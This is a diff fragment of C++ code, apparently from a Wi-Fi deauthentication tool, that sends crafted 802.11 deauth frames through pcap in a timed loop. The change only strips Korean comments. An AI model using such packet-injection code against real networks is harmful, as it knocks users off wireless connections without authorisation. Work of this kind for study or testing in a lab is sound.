@@ -46,12 +46,11 @@ int main(int argc, char *argv[])
 
     deauth_body->fixedparam = 0x0007;
 
-    deauthpkt deauth_pkt; // 유니크 포인터 대신 일반 객체 사용
+    deauthpkt deauth_pkt;
     deauth_pkt.radio_hdr = *radio_hdr;
     deauth_pkt.deauth_hdr = *deauth_hdr;
     deauth_pkt.deauth_body = *deauth_body;
 
-    // 현재 시간을 기록
     auto start = std::chrono::steady_clock::now();
 
     while (true)
@@ -63,10 +62,8 @@ int main(int argc, char *argv[])
             fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
         }
 
-        // 0.1초 대기
         std::this_thread::sleep_for(std::chrono::milliseconds(100));
 
-        // 10초가 지났는지 확인
         auto end = std::chrono::steady_clock::now();
         if (std::chrono::duration_cast<std::chrono::seconds>(end - start).count() >= 10)
             break;
